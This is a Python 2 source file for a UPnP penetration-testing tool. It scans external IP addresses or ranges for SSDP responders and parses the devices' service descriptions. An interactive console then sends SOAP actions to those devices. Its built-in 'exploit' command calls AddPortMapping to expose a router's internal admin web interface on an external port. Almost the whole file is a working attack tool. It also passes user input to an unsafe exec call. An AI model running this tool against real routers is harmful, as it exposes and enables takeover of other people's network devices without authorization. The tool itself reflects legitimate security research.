#!/usr/bin/env python
# This is UPnP pentesting program that can search for open 1900 UDP ports on arbitrary
# external IP addresses or IP ranges. The difference between Miranda and this tool is
# that Miranda can only search for UPnP devices on internal network, while this tool
# doesn't have that limitation.
#
# Authors         : Danijel Grah  (danijel.grah@viris.si)
# Disclosure Date : 16. March 2013
#

import subprocess
import getopt
import sys
import re
import urllib
import os
import cmd
#reload(cmd)
import readline
from xml.dom import minidom
from SOAPpy import *
from urlparse import urlparse
from IPy import IP


class SatUpnp:
	def __init__(self,ip="",port="",url="", localIP=""):
		self.port = port
		self.ip=ip
		self.url=url
		self.localIP=localIP


class Search:
	def __init__(self,remote_ip,remote_port,timeout=7):
		self.remote_ip = remote_ip
		self.remote_port = remote_port
		self.timeout = timeout
	
	def getDesc (self):
		packet = "M-SEARCH * HTTP/1.1\r\n"\
		  "HOST: 239.255.255.250:1900\r\n"\
		  "ST: upnp:rootdevice\r\n"\
		  "MX:2\r\n"\
		  "MAN:\"ssdp:discover\"\r\n"				
		sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
		sock.sendto(packet, (self.remote_ip,self.remote_port) )
		timeout = self.timeout
		output=""
		while True:
			sock.settimeout(timeout)
			try:	
				data, addr = sock.recvfrom(4096)
				output+=data
			except Exception, e:
				break
		urls = re.findall('http[s]?://(?:[a-zA-Z]|[0-9]|[$-_@.&+]|[!*\(\),]|(?:%[0-9a-fA-F][0-9a-fA-F]))+', output)
		unique = set(urls)
		return unique	

class Console(cmd.Cmd):

	def __init__(self):
		cmd.Cmd.__init__(self)
		self.prompt = "cmd> "
		self.intro  = "Parsing done..."  
	
	def setSatUpnp(self,sat):
		self.sat = sat

	def do_exploit(self,args):
		services = p.getServices()
		if len(args)==0:
			print "[0] Open admin interface on router"
		else:
			args = args.split(' ');
		
		if len(args) > 0:
			if args[0].isdigit():
				index = int(args[0])
				if index == 0:
					found = False
					ser, act = None,None
					for service in services:
						for action in service.actions:
							if action.name == "AddPortMapping":
								found = True
								ser = service
								act = action
					if not found:
						print "Action AddPortMapping doesn't exists. Try manually!"
					else:
						defaultArgValues={}
						defaultArgValues['NewRemoteHost'] = "" 
						defaultArgValues['NewExternalPort']=8081
						defaultArgValues['NewProtocol']="TCP"
						defaultArgValues['NewInternalPort']= 80
						defaultArgValues['NewInternalClient']= self.sat.localIP
						defaultArgValues['NewEnabled']= 1
						defaultArgValues['NewPortMappingDescription']= "upnp"
						defaultArgValues['NewLeaseDuration']= 0				
						for index in range(1,len(args)):
							arg = args[index]
							argname  = arg.split('=')[0]
							argvalue = arg.split('=')[1]	
							defaultArgValues[argname] = argvalue
						print "sending this values: "
						print defaultArgValues
						print "-----------"
						print "Result: "
						self.send(ser.endpoint,ser.stype,act.name,defaultArgValues)
						print "-----------"
						print "If you wont to change some params do it like this: exploit 0 NewExternalPort=8082"
			else:
				print "Argument not in correct format!"
			
			 
		
	def do_service(self, args):
	
		services = p.getServices()		
		
		if not self.checkArgs(args):
			print "Arguments not in correct format!"
		else:					
			if len(args) == 0:
				for index in range(len(services)):
					if services[index].getServiceType() is not None:
						print "[%d] %s" %(index,services[index].getServiceType())
  			else:
				args = args.split(' ');
			
			if len(args) == 1:
				if self.checkDigit(args[0],len(services)):
					index = int(args[0])
					print services[index].getServiceType()
				else:
					print "Argument not in correct format!"
			elif len(args) == 2:	
				if self.checkDigit(args[0],len(services)):										
					index = int(args[0])
					service = services[index]				
					for index in range(len(service.actions)):
						print "[%d] %s" %(index,service.actions[index].name)
				else:
					print "Argument not in correct format!"
			elif len(args) == 3:
				if self.checkDigit(args[0],len(services)):
					index = int(args[0])
					service = services[index]
					if self.checkDigit(args[2],len(service.actions)):
						index2 = int(args[2])
						action = service.actions[index2]
						args = action.arguments
						for arg in args:
							print "Arg name: %s, State var:%s, Direction:%s, Type: %s, Allowed values: %s" %(arg.name, arg.argStateVar, arg.direction,arg.varType,arg.allowedValues)
					else:
						print "Argument not in correct format!"
				else:
					print "Argument not in correct format!"
		
			elif len(args) == 4:
				if self.checkDigit(args[0],len(services)):
					index = int(args[0])
					service = services[index]
					if self.checkDigit(args[2],len(service.actions)):
						index2 = int(args[2])
						action = service.actions[index2]
						argList = action.arguments
						argValues={}
						for arg in argList:
							
							if arg.direction == "in":
								value = raw_input("%s ( %s ) ( %s ): "%(arg.name,arg.varType,arg.allowedValues))
								while True:
									if self.parseValue(value,arg.varType,arg.allowedValues)!= None:
										break
									else:
										value = raw_input("%s ( %s ) ( %s ): "%(arg.name,arg.varType,arg.allowedValues))									
								argValues[arg.name]=value
						namespace=service.stype
						self.send(service.endpoint,namespace,action.name,argValues)
								
					else:
						print "Argument not in correct format!"		
				else:
					print "Argument not in correct format!"	
	def do_EOF(self, line):
		return True

	def postloop(self):
		print

	def checkDigit(self,digit,length):
		if str(digit).isdigit() and int(digit) < length:
			return True
		return False
	def checkArgs(self,args):
		if len(args)== 0:
			return True
		else:
			args = args.split(' ')
		
		if len(args) == 1 and args[0].isdigit(): 
			return True
		elif len(args) == 2 and args[1]== "action":
			return True
		elif len(args) == 3 and args[1]=="action" and args[2].isdigit():
			return True
		elif len(args) == 4 and args[1]=="action" and args[2].isdigit() and args[3] == "send":
			return True

		return False  
		
	def parseValue(self, value, valType, allowed):
		if valType == "string" and len(allowed)==0:
			return value
		elif valType=="string" and len(allowed)>1:
			if value in allowed:
				return value
		elif valType=="boolean":
			if value==str(0) or value==str(1):
				return value
		else:
			if (value.isdigit()):
				return int(value)			
		
		return None

	def send(self, endpoint, namespace,action,args):
		soapaction = namespace+"#"+action
		server =  SOAPProxy(endpoint,namespace)

		try:
			argStr = ""
			for k,v in args.iteritems():
				if (type(v)==int):
					v = str(v)
				else:	
					v = "\""+v+"\""
				temp = "%s=%s"%(str(k), v)
				argStr = argStr+temp+","
			#remove the last dot			
			argStr = argStr[:-1]
			cmd = "print server._sa(soapaction).action("+argStr+")"		
			exec cmd
		except Exception, err:
			print err


class Service:

	def __init__(self,stype=""):
		self.stype=stype		
		self.device=""
		self.scpdurl=""
		self.actions=[]
		self.endpoint = ""

	def setService(self,device, controlURL, scpdurl,actions=[],endpoint=""):
		self.device = device
		self.controlURL = controlURL
		self.scpdurl = scpdurl
		self.actions = actions
		self.endpoint = endpoint
	
	def getInfo(self):
		print "Device: %s, Service type: %s, Control URL: %s"%(self.device,self.stype,self.scpdurl)		
	
	def getServiceType(self):
		return self.stype

class Action:

	def __init__(self,name=None, arguments=[]):
		self.name=name
		self.arguments=arguments
	


class Argument:
		
	def __init__(self, name=None, argStateVar=None, direction=None, varType=None, allowedValues=[]):
		self.name = name
		self.argStateVar = argStateVar
		self.direction = direction
		self.varType = varType
		self.allowedValues = allowedValues
	

class Parser:

	def __init__(self):
		self.services=[]
		
	
	def parse(self,dom,sat):

		if sat.localIP == None:
			try:
				presentationURLs = dom.getElementsByTagName('presentationURL')
				presentationURL= presentationURLs[0].childNodes[0].nodeValue
		
				parsedurl = urlparse(presentationURL)
				ip =  parsedurl.netloc[:parsedurl.netloc.rfind(':')]
				sat.localIP = ip
			except Exception:
				raise Exception("Could not parse local ip number. Try to set it manualy with parameter -l");

		services = dom.getElementsByTagName('service')
		for service in services:
			stype = service.getElementsByTagName('serviceType')[0]
			stype = stype.childNodes[0].nodeValue
			scpdurl = service.getElementsByTagName('SCPDURL')[0]
			scpdurl = scpdurl.childNodes[0].nodeValue
			controlURL = service.getElementsByTagName('controlURL')[0]
			controlURL = controlURL.childNodes[0].nodeValue
			device = service.parentNode.parentNode.getElementsByTagName('friendlyName')[0]
			device = device.childNodes[0].nodeValue
			#create new Service
			s = Service(stype)
			acts_arr = []
			if "http://"+sat.ip + ":" + str(sat.port) in scpdurl:	
				url = scpdurl
			elif "http://"+sat.ip in scpdurl:
				url = scpdurl
			else:
				url = "http://"+sat.ip + ":" + str(sat.port) + scpdurl
			dom2 = minidom.parse(urllib.urlopen(url));			
			stateVars = dom2.getElementsByTagName('stateVariable')
			actions = dom2.getElementsByTagName('action')
				
			for action in actions:
				nameNode = action.getElementsByTagName('name')[0]
				name = nameNode.childNodes[0].nodeValue
				argumentList = action.getElementsByTagName('argument')
				args = []
				for argument in argumentList:
					argName = argument.getElementsByTagName('name')[0]
					argName = argName.childNodes[0].nodeValue
					argStateVar = argument.getElementsByTagName('relatedStateVariable')[0]
					argStateVar = argStateVar.childNodes[0].nodeValue
					direction = argument.getElementsByTagName('direction')[0]
					direction = direction.childNodes[0].nodeValue
					for stateVar in stateVars:
						stateVarName = stateVar.getElementsByTagName('name')[0]
						stateVarName = stateVarName.childNodes[0].nodeValue
						if stateVarName == argStateVar:
							stateVarType = stateVar.getElementsByTagName('dataType')[0]
							stateVarType = stateVarType.childNodes[0].nodeValue
							allowedV = []
							allowedValues=stateVar.getElementsByTagName('allowedValue')
							for allowed in allowedValues:
								allowedV.append(allowed.childNodes[0].nodeValue)
					newArg = Argument(argName, argStateVar, direction, stateVarType, allowedV)
					args.append(newArg)
				newAction = Action(name,args)
				acts_arr.append(newAction)

			endpoint = "http://"+sat.ip + ":" + str(sat.port)+controlURL
			s.setService(device,controlURL,scpdurl,acts_arr,endpoint)
			self.services.append(s)
	def getServices(self):
		return self.services		

if __name__ == '__main__':
	     
	try:
		opts, args = getopt.getopt(sys.argv[1:], "hi:p:t:d:l:f:o:", [])
	except getopt.GetoptError, err:
		print err
		sys.exit(2)

	if len(opts) == 0:
		print "No arguments specified. See help for usage"
		sys.exit(2)

	ip,port,timeout,local_ip, ip_range,output,path,url = None,1900,3,None, None, None,None,None
    
	for o,a in opts:
		
		if o == "-i":
			ip = a
		elif o == "-p":
			port = a
		elif o == "-d":
			path = a
		elif o == "-t":
			timeout = a
		elif o == "-l":
			local_ip = a
		elif o == "-f":
			ip_range = a
		elif o =="-o":
			output=a
			
	if o == "-h":
		print """
		
	Parameters:
		-i (ip address to send msearch request)
		-p (port number to send msearch request)
		-d (destination URL where device description in XML can be found)
		-t (time to wait for response)
		-l (local ip. In case when parsing failed to parse local ip address of router)
		-f (ip address or ip range to send msearch requests)
		-o (output file to store the search results, using in combination with -f)

	Usage expamples:
	
	#python satupnp.py -f 192.168.1.0/24 -o file (search in ip range for upnp active devices and save it to file)	
		
	#python satupnp.py -i 192.168.1.1 -p 1900 -t 10

	The above command sends to IP 192.168.1.1 and UDP port 1900 the MSEARCH HTTP request and waits 
	for the response 10 s. Default timeout is 3s. If some response recieved the program parses services 
	and avaliable actions.

	#python satupnp.py -d http://192.168.178.1:1900/igd.xml

	The above command parses services and actions from manualy added XML path (If you found it somewhere like SHODAN)

	After entering cmd mode (cmd> ) you can USE two command types:

	1) Manually

	cmd>service  (gets the list of services)

	cmd>service 2 action (gets the actions for service number 2)

	cmd>service 2 action 1 (gets the parameters for service 2 action 1)

	cmd>service 2 action 1 send (promts for input parameters and sends soap message)

	2) Automatic

	cmd>exploit (shows the exploits available)

	cmd>exploit 0 (trigers exploit 0 -> AddPortMapping)

	cmd>exploit 0 NewExternalPort=9091 NewRemoteHost=192.168.2.1 (trigers exploit 0 with overwriten params NewExternalPort, NewRemoteHost)
		
		"""
		sys.exit(1)
		
	operation_mode = False

	#parsing from path
	if ip == None and not (path is None):
		operation_mode = True
		url = path
		parsedurl = urlparse(url)
		port = parsedurl.netloc[parsedurl.netloc.rfind(':')+1:]
		ip =  parsedurl.netloc[:parsedurl.netloc.rfind(':')]
		
	#parsing from ip
	elif not (ip is  None) and ip_range==None:
		operation_mode = True
		if not(port is None):
			port = int(port)
		if not (timeout is None):
			timeout = float(timeout)
			
		search = Search(ip,port,timeout)
		urls = list(search.getDesc())
		if len(urls)==0:
			print "Not responding to M-SEARCH, try an URL with parameter -d or increase timeout (parameter -t). Default timeout is 3.0 s"
			sys.exit(1) 			
		print "Found description XML on URL's:"
		for index in range(0,len(urls)):
			print "[%d] %s"%(index,urls[index])
		value=0
		if len(urls) > 1:
			while True:
				value = raw_input("URL to parse: ")
				if value.isdigit():
					break						
		url = urls[int(value)]
		parsedurl = urlparse(url)
		desc_port = parsedurl.netloc[parsedurl.netloc.rfind(':')+1:]
		desc_ip =  parsedurl.netloc[:parsedurl.netloc.rfind(':')]
		
		remove = "http://"+desc_ip+":"+desc_port
		add = "http://"+ip+":"+desc_port
		url=url.replace(remove, add)
		port = desc_port	
		local_ip = desc_ip
    #search network for upnp devices
	elif not(ip_range is None) and not(output is None):
		
		operation_mode = False
		network = IP(ip_range)
		index=0
		if not(port is None):
			port = int(port)
		if not (timeout is None):
			timeout = float(timeout)
		try:
			f = open(output,'w')
			for ip in network:
				ip = str(ip)
				last = ip[ip.rfind('.')+1:]
				if last == "0" or last=="255":
					continue 
				sys.stdout.write("\rSearching IP: %s"%ip)
				#print
				sys.stdout.flush()
				search = Search(ip,port,timeout)
				urls = list(search.getDesc())
				if len(urls) > 0:
					print
					print(urls)
					f.write("%s %s\n"%(ip,urls))
				sys.stdout.flush()
		except Exception, e:
			print e	
			f.close()
		print
		print "Found urls written to %s"%(output) 
				
	if operation_mode:
	    sat = SatUpnp(ip,int(port),url, local_ip)
	    try:
		    dom = minidom.parse(urllib.urlopen(url))	
		    p = Parser()
		    p.parse(dom,sat) 
	    except Exception, e:
		    print e
		    print "Parsing failed .... " 
		    sys.exit(2)	
		    
	    console = Console()
	    console.setSatUpnp(sat)
	    console . cmdloop() 

